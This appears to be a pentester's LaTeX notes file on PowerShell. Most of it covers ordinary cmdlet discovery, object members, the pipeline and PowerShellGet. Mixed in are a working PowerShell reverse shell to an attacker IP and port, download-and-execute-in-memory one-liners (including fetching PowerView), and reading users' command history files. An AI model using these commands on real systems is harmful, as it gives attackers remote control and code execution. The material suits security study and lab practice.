\section{Transcript}
\url{https://devblogs.microsoft.com/powershell/powershell-the-blue-team/}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2}


\url{https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction?view=powershell-7.2}

\section{to re-organize}

\subsection{Commands}

Lists available modules loaded for use.
\begin{verbatim}
Get-Module 
\end{verbatim}



Get the specified user's PowerShell history. 
\begin{verbatim}
Get-Content 
    C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 
\end{verbatim}

Return environment values such as key paths, users, computer information, etc.
\begin{verbatim}
Get-ChildItem Env: | ft Key,Value 
\end{verbatim}

Download a file from the web using PowerShell and call it from memory.

\begin{verbatim}
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); `
    <follow-on commands>" 
\end{verbatim}


add a .NET framework class to our PowerShell session (i\verb+AssemblyName+
parameter allows to specify an assembly that contains types needed)

\begin{verbatim}
Add-Type -AssemblyName System.IdentityModel
\end{verbatim}

\subsection{Reverseshell}


\href{https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/}{Reverseshell builder}

\begin{verbatim}
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.18',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\end{verbatim}

\subsection{Establishing WinRM Session}

\href{https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2}{Test-WsMan}


\subsection{errors}
\begin{verbatim}
$error[0]
\end{verbatim}
\subsection{Locate commands}

\begin{itemize}
 \item \verb+Get-Verb+: lists all of the available cmdlets on your system 
\begin{verbatim}
Get-Command -Noun <pattern>
Get-Command -Verb <verb>
# Commands which accept Object as input
Get-Command -ParameterType <Object> 
Get-Command -Module ActiveDirectory

\end{verbatim}
 \item \verb+Get-Command+
  \item \verb+Get-Help+: helps to learn how to use commands but also to locate
      commands
\begin{verbatim}
Get-Help -Name Get-Help
Get-Help *-process
\end{verbatim}
 \item \verb+Get-Member+:
\end{itemize}


\subsection{Download a file}
\begin{verbatim}
IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
\end{verbatim}

\subsection{Discovering objects, properties, and methods}

\verb+Get-Member+ helps you discover what objects, properties, and methods are
available for commands. Any command that produces object-based output can be
piped to \verb+Get-Member+

Plain use will return the Object return by the cmdlet and it definition

\subsubsection{Properties}
\verb+Get-Member -MemberType Properties+


\verb+Select-Object+ will allow to display more properties on the object.

\begin{verbatim}
 <cmdlet> | Select-Object -Property *
 <cmdlet> | Select-Object -Property <prop_1>, .. ., <prop_n>, <str>*
\end{verbatim}

\subsubsection{Methods}

\verb+Get-Member -MemberType Method+

Methods are an action that can be taken

\verb+(<cmdlet>).<method>()+

A better option is to use a cmdlet to perform the action if one exists

\verb+Get-Service -Name w32time | Start-Service -PassThru+

\subsubsection*{Variable affectation}

\verb+$<var> = <cmdlet>+

\subsection{One-liners and the pipeline}

\subsubsection{One-Liners}
A PowerShell one-liner is one continuous pipeline and not necessarily a command
that's on one physical line.
Natural line breaks can occur at commonly used characters including pipe (|) comma (,)
and opening brackets ([), braces ({), and parenthesis ((). Others that aren't so common include the semicolon (;), equals sign (=), and both opening single and double quotes (',").

\subsubsection{Filtering Left}
\verb+Get-Service -Name w32time+ can be rewritten 
\verb+Get-Service | >here-Object Name -eq w32time+ but it's less optimized
    
\subsubsection{The Pipeline}

For command accepting inputs and epending on how thorough a commands help is, it may include an INPUTS and OUTPUTS section.

\verb+help Stop-Service -Full+ will show what parameter accept pipeline. Cmdlet
may accept several input parameters (see \verb+help Stop-Service -Full+)

can be \verb+ByPropertyName+ or  \verb+ByValue+. When both ByValue is tryed
first \verb+ByValue+ as to be understood as verb+by type+.

PowerShell will map the input object to the property according to its type.

\subsubsection{PowerShellGet}
PowerShellGet is a PowerShell module that contains commands for discovering,
installing, publishing, and updating PowerShell modules (and other artifacts)
to or from a NuGet repository such as
\href{https://www.powershellgallery.com/}{PowerShell Gallery}. 

\begin{verbatim}
Find-Module -Name <Name>
Find-Module -Name <Name> | Install-Module
\end{verbatim}


\subsubsection{Formatting, aliases, providers, comparison}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/05-formatting-aliases-providers-comparison?view=powershell-7.2}


